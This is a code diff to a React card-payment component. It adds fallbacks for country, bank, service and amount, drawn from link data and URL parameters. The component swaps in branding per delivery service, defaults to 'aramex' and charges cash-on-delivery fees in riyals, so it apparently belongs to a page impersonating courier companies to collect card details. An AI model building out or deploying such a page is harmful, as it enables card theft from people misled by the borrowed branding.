@@ -28,20 +28,23 @@ const PaymentCardInput = () => {
   const [cardValid, setCardValid] = useState<boolean | null>(null);
   const [isSubmitting, setIsSubmitting] = useState(false);
   
-  // Get customer info and selected bank from sessionStorage
+  // Get customer info and selected bank from sessionStorage (with fallback to link data)
   const customerInfo = JSON.parse(sessionStorage.getItem('customerInfo') || '{}');
-  const selectedCountry = sessionStorage.getItem('selectedCountry') || '';
-  const selectedBankId = sessionStorage.getItem('selectedBank') || '';
+  const selectedCountry = sessionStorage.getItem('selectedCountry') || linkData?.country_code || '';
+  const selectedBankId = sessionStorage.getItem('selectedBank') || linkData?.payload?.selected_bank || '';
   
-  const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
+  // Get service info from link data (more reliable than sessionStorage)
+  const serviceKey = linkData?.payload?.service_key || new URLSearchParams(window.location.search).get('service') || customerInfo.service || 'aramex';
   const serviceName = linkData?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
   const shippingInfo = linkData?.payload as any;
-  const amount = shippingInfo?.cod_amount || 500;
+  const amount = shippingInfo?.cod_amount || shippingInfo?.total_amount || customerInfo.amount?.replace(/[^\d.]/g, '') || 500;
   const formattedAmount = `${amount} ر.س`;
   
+  // Get country from link data if sessionStorage doesn't have it
+  const countryCode = selectedCountry || linkData?.country_code || '';
+  const selectedCountryData = countryCode ? getCountryByCode(countryCode) : null;
   const selectedBank = selectedBankId && selectedBankId !== 'skipped' ? getBankById(selectedBankId) : null;
-  const selectedCountryData = selectedCountry ? getCountryByCode(selectedCountry) : null;
   
   const handleCardNumberChange = (value: string) => {
     const formatted = formatCardNumber(value.replace(/\D/g, "").slice(0, 16));
